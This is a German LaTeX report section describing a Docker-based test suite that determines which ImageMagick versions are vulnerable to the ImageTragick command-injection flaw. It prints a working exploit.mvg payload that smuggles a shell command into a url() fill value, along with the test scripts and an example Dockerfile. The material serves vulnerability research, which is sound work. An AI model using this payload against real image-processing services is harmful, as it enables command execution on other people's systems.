\newpage
\subsection{Tests der Imagemagick Versionen via Docker Container}\label{subsec:tests-der-imagemagick-versionen-via-docker-container}

\subsubsection{Einleitung}

Um zu validieren, welche Versionen genau gegen die Sicherheitslücke angreifbar sind, wird eine Test-Suite aufgebaut,
die in dem folgenden Kapitel beschrieben ist.
In dieser Testsuite können schnell verschiedene Imagemagick-Versionen gegen verschiedene Betriebssysteme getestet werden.

\subsubsection{Dateiaufbau}

\begin{lstlisting}[language=Text, caption=Übersicht über alle Dateien in der Testsuite,label={lst:testsuiteoverview}]
test-suite/
    debug.sh
    global
        entryPoint.sh
        exploit.mvg
        PRIVATE_FILE
        working.jpeg
    test.sh
    ubuntu-12.04-6.9.3-9_src_official
    ubuntu-14.04-6.9.3-9_src_official
    ubuntu-14.04-6.9.3-9_src_official
    ubuntu-18.04-6.9.3-10_src_official
    ubuntu-18.04-6.9.3-9_src_fork
    ubuntu-18.04-6.9.3-9_src_official
    ...
\end{lstlisting}
\vspace{5mm}

\subsubsection{Test-Image Beschreibungen}

Alle ubuntu-* Dateien, sind Dockerfiles, die ein Ubuntu-Image beschreiben,
welches Imagemagick in einer bestimmten Version installiert.\\

Jedes Docker-Image hat in der Test-Suite folgenden Aufbau:

\begin{itemize}
    \item Als Basis-Image wird ubuntu gewählt.
    Die Version unterscheidet sich, je nach Datei
    \item Es werden Dependencies zum bauen der C-Dateien zu binaries installiert.
    Beispielsweise make und gcc
    \item Es wird Imagemagick in einer bestimmten Version installiert
    \item Am Schluss jedes Image werden die Dateien aus dem global/ Ordner zu dem Image hinzugefügt und die entryPoint.sh Datei als Standard-Einsprungs-Script ausgewählt
\end{itemize}

\newpage

Beispiel: ubuntu-18.04-6.9.3-9\_src\_official

\begin{itemize}
    \item Als Basis-Image wird ubuntu in der Version 18.04 benutzt
    \item Es wird Imagemagick Version 6.9.3-9 direkt aus dem offiziellen GitHub Reposirory installert.
    Da diese Version nicht mit einem Git-Tag markiert wurde,
    muss direkt der letzte Release-Commit~\cite{ReleaseImageMagick393-9} ausgecheckt werden.
\end{itemize}

\begin{lstlisting}[language=Docker, caption=Beispiel Dockerfile aus der Testsuite,label={lst:testsuiteexample}]
# Base Image
FROM ubuntu:18.04

# Prepare
WORKDIR /run
RUN cd /run

# Packet packages sources
RUN apt-get update

# Dependencies
RUN apt-get update
RUN apt-get install -y make gcc wget xz-utils git

# Get sources
RUN mkdir code
WORKDIR code
RUN git clone https://github.com/ImageMagick/ImageMagick6.git .
RUN git checkout 2458872ae906063029ed413f77946791cc20b64e

RUN ls -la

# Unpack and install
RUN ./configure
RUN make
RUN make install

# Workdir
WORKDIR /run
RUN cd /run

# Set Env
ENV LD_LIBRARY_PATH=/usr/local/lib

# Util dependencies
RUN apt-get install -y vim
RUN apt-get install -y curl

# add global files
ADD ./global .

# run entrypoint
CMD ["bash", "entryPoint.sh"]
\end{lstlisting}
\vspace{5mm}

\newpage

\subsubsection{Der global/ Ordner}

Der global/ Ordner enthält Dateien, die für alle Tests in benötigt werden.

\subsubsubsection{PRIVATE\_FILE}

Es wird eine Datei erstellt, die per Exploit ausgelesen werden soll.

\begin{lstlisting}[language=Text, caption=Geheime Datei in Testsuite,label={lst:testsuiteprivatefile}]
> cat PRIVATE_FILE
PRIVATE-CONTENT
\end{lstlisting}
\vspace{5mm}

\subsubsubsection{exploit.mvg}

Diese Datei wird im nachfolgend von ImageMagick aufgerufen und enthält den Code,
welcher den Inhalt der PRIVATE\_FILE ausgibt.

\begin{lstlisting}[language=Text, caption=exploit.mvg in Testsuite,label={lst:testsuiteexploit}]
push graphic-context
viewbox 0 0 640 480
fill 'url(https://testimage.png"|cat "PRIVATE_FILE)'
pop graphic-context
\end{lstlisting}
\vspace{5mm}

Eine Beschreibung, warum der hinterlegte Code ausgeführt wird, ist im Kapitel "`Details der Schwachstelle"' zu finden .


\subsubsubsection{entryPoint.sh}

\begin{lstlisting}[language=Text, caption=entryPoint.sh in Testsute,label={lst:testsuiteentry}]
#!/bin/bash

identify exploit.mvg
echo 'AFTER_IDENTIFY'
\end{lstlisting}
\vspace{5mm}

Dieses Shell-Script wird von jedem Dockerfile aufgerufen, um den Exploit auszunutzen.
Dabei wird die identify-Funktion von Imagemagick angesprochen.\\

Das nachfolgende echo wird als Flag benutzt, um sicherzustellen, dass entryPoint.sh auch wirklich aufgerufen wird.
Dies wird später in test.sh etwas genauer erläutert.


\subsubsubsection{working.jpeg}

Hier handelt es sich um ein valides JPEG-Bild File,
welches bei dem eigentlichen Test nicht direkt benötigt,
jedoch zu debug zwecken nützlich ist,
um die generelle Funktionsfähigkeit von Imagemagick und dem Identify Befehl zu testen.


\subsubsubsection{test.sh}

Mit diesem Script wird der Test einer speziellen Umgebung angestoßen.
Hierbei wird der Name des Dockerfiles als ersten Parameter übergeben.

\begin{lstlisting}[language=Text, caption=Beispielaufruf test.sh,label={lst:testsuitecall}]
./test.sh ubuntu-18.04-6.9.3-9_official
\end{lstlisting}
\vspace{5mm}

Das Script baut das Docker-Image der übergebenen Dockerfile und führt dieses aus.
Anschließend wird der Inhalt ausgewertet.
Enthält die Ausgabe nicht den Text "`AFTER\_IDENTIFY"'
(wird von entryPoint.sh ausgeführt), kann davon ausgegangen werden,
dass die Dockerfile fehlerhaft aufgebaut ist und das entryPoint.sh script nicht von Docker ausgeführt wurde.\\

Als zweites wird überprüft, ob die Ausgabe den String "`PRIVATE\_CONTENT"' enthält,
welches der Inhalt der PRIVATE\_FILE ist,
welche per Exploit - siehe exploit.mvg ausgelesen wird.
Wenn dies der Fall ist, kann man darauf schließen, dass die installierte Imagemagick Version
auf dem ausgewählten Betriebssystem angreifbar gegenüber der hier gezeigten Sicherheitslücke ist.

\begin{lstlisting}[language=Text, caption=test.sh Script in Testsuite,label={lst:testsuitetestscript}]
#!/bin/bash

DOCKERFILE_NAME="$1"

GREEN="\e[32m"; RED="\e[31m"; RESET="\e[0m"

IDENTIFY=$(
  docker build -t "imagemagick_test_$1" -f $1 . | tee /dev/tty &&
  docker run "imagemagick_test_$1"  | tee /dev/tty
)

echo '-----------------------------------------------------------'

if [[ "$IDENTIFY" != *"AFTER_IDENTIFY"* ]];
then
  echo -e "$RED Error bei der Ausführung! $RESET"
fi

if [[ "$IDENTIFY" == *"PRIVATE-CONTENT"* ]];
then
  echo -e "$GREEN Sicherheitslücke ausgenutzt! $RESET"
else
  echo -e "$RED Sicherheitslücke nicht ausgenutzt! $RESET"
fi

echo '-----------------------------------------------------------'

if [[ "$IDENTIFY" == *"PRIVATE-CONTENT"* ]];
then
  exit 0
else
  exit 1
fi
\end{lstlisting}
\vspace{5mm}


\subsubsubsection{debug.sh}

Auch dieses Script bekommt den Namen einer Dockerfile übergeben.
Es baut einen Docker-Container und öffnet eine Interaktive Bash-Shell auf dem Container.
So können in dem Container beliebige Imagemagick Befehle ausgeführt werden.
Außerdem können Config-Dateien, wie delegate.xml oder properties.xml beliebig bearbeitet werden.

\begin{lstlisting}[language=Text, caption=Script debug.sh in Testsuite,label={lst:testsuitedebugcall}]
#!/bin/bash

DOCKERFILE_NAME="$1"

docker build -t "imagemagick_test_$1" -f $1 .
docker run -it "imagemagick_test_$1" /bin/bash
\end{lstlisting}
\vspace{5mm}

\subsubsubsection{Erkenntnisse}

Die letzte angreifbare Version für ImageMagick 6 ist 6.9.3-9.
In Version 6.9.3-10 ist der exploit in der Standard-Konfiguration nicht mehr reproduzierbar.
Außerdem ist für ImageMagick 7 die Version 7.0.1-0 angreifbar.
Auch hier ist mit dem nächsten Patch 7.0.1-1 die Schwachstelle nicht mehr ausnutzbar.\\
Die relevanten Änderungen zwischen den Versionen, werden im nächsten Kapitel "`Verteitigung der Schwachstelle"' erläutert.

Bei den Tests mit den verschiedenen Versionen wird deutlich, dass einzig die ImageMagick Version ausschlaggebend ist,
ob der Exploit ausnutzbar ist.
Auch ein relativ neues Ubuntu 18.04 ist angreifbar, sofern eine alte ImageMagick Version installiert ist.
Die Angaben der Betriebssysteme beziehen sich also nur darauf,
dass auf diesem Betriebssystem per Paketverwaltung eine angreifbare imagemagick Version ausgeliefert wurde.\\